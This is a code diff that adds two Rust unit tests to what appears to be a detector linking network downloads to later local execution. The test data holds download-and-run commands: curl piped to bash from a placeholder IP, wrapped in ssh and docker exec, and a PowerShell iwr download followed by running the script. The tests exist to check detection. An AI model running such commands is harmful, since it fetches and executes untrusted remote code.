@@ -153,6 +153,28 @@ fn a_download_in_a_container_or_on_another_host_does_not_link_to_a_local_run() {
     }
 }
 
+/// A download piped to a local shell links, beside a command another host
+/// runs and when a container prints the file.
+#[test]
+fn a_download_piped_to_a_local_shell_links_beside_a_launched_command() {
+    for command in [
+        "ssh host 'a; b; c'; curl https://203.0.113.10/s.sh | bash",
+        "docker exec c curl https://203.0.113.10/s.sh | bash",
+    ] {
+        assert!(linked(&[(command, None)]), "{command}");
+    }
+}
+
+/// A file a local launcher downloads links to a later stage of the same call
+/// that runs it.
+#[test]
+fn a_download_a_local_launcher_writes_links_to_a_run_in_the_same_call() {
+    assert!(linked(&[(
+        "powershell -Command \"iwr https://203.0.113.10/a.ps1 -OutFile a.ps1\"; ./a.ps1",
+        Some("2026-09-17T00:00:00Z")
+    )]));
+}
+
 /// A download a local runner starts links to a later run of the file.
 #[test]
 fn a_download_a_local_runner_starts_links_to_a_later_run() {
